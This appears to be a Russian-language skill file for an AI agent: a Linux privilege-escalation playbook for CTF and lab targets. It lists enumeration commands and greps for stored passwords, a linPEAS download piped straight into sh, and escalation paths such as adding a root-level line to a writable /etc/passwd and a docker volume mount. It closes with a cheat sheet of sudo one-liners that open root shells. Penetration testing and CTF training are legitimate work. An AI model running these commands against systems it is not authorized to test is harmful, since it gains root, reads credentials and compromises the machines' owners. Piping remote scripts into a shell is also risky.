---
name: linux-privesc
description: Локальное повышение привилегий в Linux для CTF и лабораторий - ручная методика (sudo/SUID/capabilities/cron/PATH/конфиги), linPEAS как сканер, интерпретация находок и GTFOBins-однострочники. Используй сразу после получения низкопривилегированного шелла на Linux-цели.
---
# Linux Privesc — от www-data до root

## 1. Ручной быстрый сет (5 минут, всегда первым)

```sh
id; whoami; hostname
sudo -l                                 # главный артефакт
find / -perm -4000 -type f 2>/dev/null  # SUID
getcap -r / 2>/dev/null                 # capabilities
ls -la /etc/cron* /var/spool/cron* 2>/dev/null; cat /etc/crontab
ps auxf                                 # что крутится от root
env; echo $PATH                          # writable-каталоги в PATH?
cat /etc/passwd | grep -v nologin       # кто есть; writable /etc/passwd?
grep -rIl 'password\|pass=\|pwd=' /home /var/www /opt /srv 2>/dev/null | head
history; ls -la ~ /tmp /var/tmp /dev/shm
```

Смотри не «что нашлось», а **что из найденного исполняется от root и доступно на запись**.

## 2. linPEAS — сканер

Не вендорится в пакет (лицензия проекта). Доставка на цель:

```sh
# с Kali: apt install peass; файл linpeas.sh из пакета, передать на цель (python3 -m http.server)
# или напрямую: curl -fsSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

Читай только красное/жёлтое; зелёное — шум. linPEAS не заменяет §1 — он его расширяет.

## 3. Интерпретация топ-находок

| Находка | Куда копать |
|---|---|
| `sudo -l` показывает binary | GTFOBins: однострочник (§4); скрипт на bash/perl/python → PATH/ENV-хайджек |
| SUID-бинарник нестандартный | GTFOBins; свой бинарник → реверс (`ida-workbench`) — там часто сравнение пароля |
| Writable-файл, исполняемый root-кроном | Перезаписать payload; cron с относительными путями → PATH-хайджек через writable-каталог |
| Writable `/etc/passwd` | `openssl passwd -1 x` → строка `root2:HASH:0:0::/root:/bin/bash` |
| Группы `docker`, `lxd`, `disk`, `video` | Групповой эскалейшн (docker → `docker run -v /:/mnt ...`, disk → деблок-доступ) |
| Capabilities: `cap_setuid`, `cap_setgid` на python/perl | Однострочник с uid-сбросом |
| Ядро/пакеты старые | Эксплойты ядра — последний ресурс: проверь версию, ищи готовый PoC, юзай только при подтверждённой версии |

## 4. GTFOBins-шпаргалка (топ)

```sh
sudo find / -exec /bin/sh \; -quit          # find
sudo vim -c '!sh'                           # vim/vi
sudo less /etc/hosts   → !sh                # less/more/man
sudo env /bin/sh                            # env
sudo awk 'BEGIN {system("/bin/sh")}'        # awk
sudo python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
sudo perl -e 'exec "/bin/sh";'
sudo nmap --interactive → !sh               # старые nmap
```

## 5. После рута

- Подтверди: `id` = uid 0; добудь целевой артефакт задачи.
- Урок — в `lessons/`: какая находка сработала, что было шумом.

## 6. Границы

Только авторизованные цели; эксплойты ядра нестабильны — сохраняй стабильный доступ до их запуска (см. `revshell-arsenal`).
